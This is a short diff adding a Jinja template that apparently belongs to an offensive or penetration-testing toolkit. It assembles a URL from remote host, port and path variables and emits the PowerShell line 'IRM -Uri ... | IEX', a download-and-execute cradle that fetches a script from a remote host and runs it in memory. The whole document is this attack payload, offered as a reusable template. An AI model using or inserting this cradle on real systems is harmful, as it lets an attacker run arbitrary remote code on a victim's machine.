@@ -1,0 +1,5 @@
+{% set url = 'http://{}{}{}'.format(
+    rhost, ':{}'.format(rport) if rport != 80 else '', path) %}
+
+IRM -Uri '{{ url }}' | IEX
+
